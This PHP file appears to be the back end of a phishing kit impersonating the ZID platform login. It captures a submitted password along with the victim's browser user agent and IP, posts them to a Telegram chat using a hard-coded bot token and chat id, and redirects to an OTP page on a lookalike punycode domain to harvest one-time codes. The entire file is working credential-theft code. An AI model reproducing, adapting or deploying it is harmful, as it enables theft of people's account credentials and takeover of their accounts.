<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {

    $password = $_POST['password'];

    // الحصول على معلومات المتصفح و IP
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    $userIP = $_SERVER['REMOTE_ADDR'];

    $token = "7996606148:AAGCkZCmT3y1en-3-zWmyk4almnDqZmbR8A";
    $chat_id = "-1002180753425";

    // تنسيق الرسالة
    $message = "╮━≪ 🔥 تسجيل دخول ZID  ≫━╭\n\n" .
               "🌟 باسورد ZID \n\n" .
               "🔑 Password : $password\n\n" .
               "━━━━━━━━━━━━━━━━\n" .
               "🖥 معلومات الجهاز: \n\n" .
               "🌐 المتصفح: \n\n$userAgent\n\n" .
               "📍 IP: $userIP\n\n" .
               "╯━≛ 🔥 تسجيل دخول ZID  ≞━╬";

    $url = "https://api.telegram.org/bot" . $token . "/sendMessage";

    $data = [
        'chat_id' => $chat_id,
        'text' => $message
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);

    header("Location: https://xn--zd-hpa.com/login/otp/otp/");
    exit();
}
?>
